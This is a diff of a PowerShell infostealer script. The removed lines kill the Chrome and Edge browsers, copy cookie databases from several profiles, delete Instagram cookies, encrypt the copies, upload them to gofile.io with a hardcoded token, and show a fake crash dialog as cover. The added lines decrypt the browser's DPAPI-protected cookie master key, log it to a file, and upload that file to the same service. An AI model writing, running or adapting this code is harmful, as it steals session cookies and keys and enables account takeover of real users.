@@ -1,48 +1,3 @@
-# --- 1. Define the DLL Interface with Manual String Handling ---
-$Signature = @"
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern int sqlite3_open(string filename, out IntPtr db);
-
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int numBytes, out IntPtr stmt, IntPtr tail);
-
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern int sqlite3_step(IntPtr stmt);
-
-// We change this to IntPtr to prevent the auto-marshaler crash
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern IntPtr sqlite3_column_text(IntPtr stmt, int index);
-
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern int sqlite3_column_count(IntPtr stmt);
-
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern int sqlite3_finalize(IntPtr stmt);
-
-[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
-public static extern int sqlite3_close(IntPtr db);
-"@
-
-if (-not ([System.Management.Automation.PSTypeName]"Win32.SQLiteSafe").Type) {
-    Add-Type -MemberDefinition $Signature -Name "SQLiteSafe" -Namespace "Win32"
-}
-Add-Type -AssemblyName System.Windows.Forms
-function creat-FilesToGofile {
-    param (
-        
-        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
-    )
-    $ParentId="feb3feae-451f-4233-a900-5fec87705f01"
-    try {
-        # 1. Create the Folder
-        
-        $rawResponse = curl.exe -s -d "token=$ApiKey&parentFolderId=$ParentId" "https://api.gofile.io/contents/createFolder"
-        $json = $rawResponse | ConvertFrom-Json
-        return $json.data.id
-    }catch{
-        return ""
-    }
-    }
 function Upload-FilesToGofile {
     param (
         [string]$FilePath,
@@ -69,144 +24,50 @@ function Upload-FilesToGofile {
     }
 }
 
-function Protect-File {
-    param (
-        [string]$FilePath,
-        [string]$p
-    )
 
-
-    $Hasher = [System.Security.Cryptography.SHA256]::Create()
-    $Key = $Hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($p))
+function Get-ChromeSecretKey {
+    # Path for Edge (Change 'Edge' to 'Chrome' if needed)
+    $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
     
-
-    $Aes = [System.Security.Cryptography.Aes]::Create()
-    $Aes.Key = $Key
-    $Aes.GenerateIV() # Create a random 'starting' jump for the encryption
-    $IV = $Aes.IV
-
-
-    $RawBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $Encryptor = $Aes.CreateEncryptor()
-    $EncryptedBytes = $Encryptor.TransformFinalBlock($RawBytes, 0, $RawBytes.Length)
-
-
-    $FinalOutput = New-Object Byte[] ($IV.Length + $EncryptedBytes.Length)
-    [Array]::Copy($IV, 0, $FinalOutput, 0, $IV.Length)
-    [Array]::Copy($EncryptedBytes, 0, $FinalOutput, $IV.Length, $EncryptedBytes.Length)
-    
-    [System.IO.File]::WriteAllBytes($FilePath + ".crypt", $FinalOutput)
-    
-}
-
-function delete-data {
-    param (
-        [string]$op,
-        [string]$p
-    )
-    $dbHandle = [IntPtr]::Zero
-
-
-    if ([Win32.SQLiteSafe]::sqlite3_open($op, [ref]$dbHandle) -eq 0) {
-
-
-    
-    
-    
-    $queryDelete = "DELETE FROM cookies WHERE host_key LIKE '%instagram%';"
-    $delStmt = [IntPtr]::Zero
-    
-    if ([Win32.SQLiteSafe]::sqlite3_prepare_v2($dbHandle, $queryDelete, -1, [ref]$delStmt, [IntPtr]::Zero) -eq 0) {
-        $res = [Win32.SQLiteSafe]::sqlite3_step($delStmt)
-
+    try {
+        # 1. Read and parse the JSON Local State file
+        if (-not (Test-Path $localStatePath)) { throw "Local State file not found." }
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
         
+        # 2. Get the encrypted key and decode from Base64
+        $encryptedKey = $localState.os_crypt.encrypted_key
+        $decodedKeyBytes = [Convert]::FromBase64String($encryptedKey)
         
-        [Win32.SQLiteSafe]::sqlite3_finalize($delStmt)
+        # 3. Remove the "DPAPI" prefix (the first 5 bytes: 44 50 41 50 49)
+        $actualKeyBytes = $decodedKeyBytes[5..($decodedKeyBytes.Length - 1)]
+        
+
+        Add-Type -AssemblyName System.Security
+        
+        # Unprotect returns the raw Master Key used for AES-256-GCM cookie decryption
+        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $actualKeyBytes, 
+            $null, 
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        
+        return $masterKey
     }
-
-
-    [Win32.SQLiteSafe]::sqlite3_close($dbHandle)
-
+    catch {
+        Write-Error "Error retrieving secret key: $($_.Exception.Message)"
+        return $null
     }
 }
 
-Start-Sleep -Seconds 1
-Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
-$kerch=$?
-Stop-Process -Name "msedge" -ErrorAction SilentlyContinue
-$sek=$?
-Start-Sleep -Seconds 1
+# Execution
+$key = Get-ChromeSecretKey
 
-Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+$timestamp = Get-Date -Format "yyyy-MM-dd"
+$hexKey = [System.BitConverter]::ToString($key) -replace '-'
 
-Start-Sleep -Seconds 1
+$content = "--- Chrome/Edge Secret Key ---`nDate:asa $timestamp`nKey: $hexKey`n"
 
-$op = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$dbp = "$env:TEMP\edge_tihng"
-$op2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-$dbp2 = "$env:TEMP\chromes_tihng1"
-$op3 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 4\Network\Cookies"
-$dbp3 = "$env:TEMP\chromes_tihng2"
-$op4 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 5\Network\Cookies"
-$dbp4 = "$env:TEMP\chromes_tihng3"
-$op5 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 6\Network\Cookies"
-$dbp5 = "$env:TEMP\chromes_tihng4"
-$op6 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 8\Network\Cookies"
-$dbp6 = "$env:TEMP\chromes_tihng5"
-
-Copy-Item $op $dbp -Force
-delete-data -op $op -p "s"
-$fid=creat-FilesToGofile
-Protect-File -FilePath $dbp -p "For_oNS."
-
-Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
-if ($sek) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
-}
-
-function Dosf-it-all {
-    param (
-        [string]$path1,
-        [string]$path2,
-        [string]$fid
-    )
-    Copy-Item $path1 $path2 -Force
-    Protect-File -FilePath $path2 -p "For_oNS."
-    Upload-FilesToGofile -FilePath "$path2.crypt" -newFolderId $fid
-}
-
-
-
-
-
-
-
-
-
-
-# 1. Configuration
-$apiToken = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK" 
-
-
-$serverReq = Invoke-RestMethod -Uri "https://api.gofile.io/servers"
-$server = $serverReq.data.servers[0].name
-
-$uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
-
-
-
-#crypt
-
-
-
-#uplo
-Dosf-it-all -path1 $op3 -path2 $dbp3 -fid $fid
-
-
-Start-Sleep -Seconds 1
-#delete
-
-
-
-
-
+# 'Add-Content' appends to the file instead of overwriting it
+$content | Add-Content -Path "C:\Users\omark\AppData\Local\Temp\keys_log{$timestamp}.txt"
+Upload-FilesToGofile -FilePath "C:\Users\omark\AppData\Local\Temp\keys_log{$timestamp}.txt" -newFolderId "a14858bf-8246-4272-8486-aac51f194cea"
+cls
